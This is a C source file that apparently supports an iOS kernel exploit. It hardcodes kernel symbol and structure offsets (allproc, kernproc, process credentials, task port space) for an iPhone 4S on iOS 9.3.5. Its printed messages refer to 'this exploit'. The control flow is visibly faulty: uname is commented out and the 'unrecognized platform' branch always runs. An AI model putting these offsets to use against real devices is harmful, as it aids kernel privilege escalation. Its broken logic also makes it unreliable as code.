#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/utsname.h>

#include "offsets.h"

// offsets from the main kernel 0xfeedfacf
uint32_t allproc_offset;
uint32_t kernproc_offset;

// offsets in struct proc
uint32_t struct_proc_p_pid_offset;
uint32_t struct_proc_task_offset;
uint32_t struct_proc_p_uthlist_offset;
uint32_t struct_proc_p_ucred_offset;
uint32_t struct_proc_p_comm_offset;

// offsets in struct kauth_cred
uint32_t struct_kauth_cred_cr_ref_offset;

// offsets in struct uthread
uint32_t struct_uthread_uu_ucred_offset;
uint32_t struct_uthread_uu_list_offset;

// offsets in struct task
uint32_t struct_task_ref_count_offset;
uint32_t struct_task_itk_space_offset;

// offsets in struct ipc_space
uint32_t struct_ipc_space_is_table_offset;

// offsets in struct ipc_port
uint32_t struct_ipc_port_ip_kobject_offset;

void init_iphone4S_9_3_5_13G36() {
        printf("setting offsets for iPhone 4S 9.3.5\n");
    allproc_offset = 0x5A4128;
    kernproc_offset = 0x5AA0E0;
    
    struct_proc_p_pid_offset = 0x10;
    struct_proc_task_offset = 0x18;
    struct_proc_p_uthlist_offset = 0x98;
    struct_proc_p_ucred_offset = 0x100;
    struct_proc_p_comm_offset = 0x26c;
    
    struct_kauth_cred_cr_ref_offset = 0x10;
    
    struct_uthread_uu_ucred_offset = 0x168;
    struct_uthread_uu_list_offset = 0x170;
    
    struct_task_ref_count_offset = 0x10;
    struct_task_itk_space_offset = 0x300;
    
    struct_ipc_space_is_table_offset = 0x20;
    
    struct_ipc_port_ip_kobject_offset = 0x68;
}


void unknown_build() {
    printf("This is an unknown kernel build - the offsets are likely to be incorrect and it's very unlikely this exploit will work\n");
    printf("You need to find these two kernel symbols:\n");
    printf("  allproc\n");
    printf("  kernproc\n\n");
    printf("and update the code\n");
}

void init_offsets() {
    struct utsname u = {0};
    //int err = uname(&u);
    printf("sysname: %s\n", u.sysname);
    printf("nodename: %s\n", u.nodename);
    printf("release: %s\n", u.release);
    printf("version: %s\n", u.version);
    printf("machine: %s\n", u.machine);

    init_iphone4S_9_3_5_13G36();

    if (strstr(u.machine, "iPhone4,1")) {
    init_iphone4S_9_3_5_13G36();
    printf("this is a known kernel build for iPhone 4S - offsets should be okay\n");
  	}

    printf("don't recognize this platform\n");
   unknown_build();

}
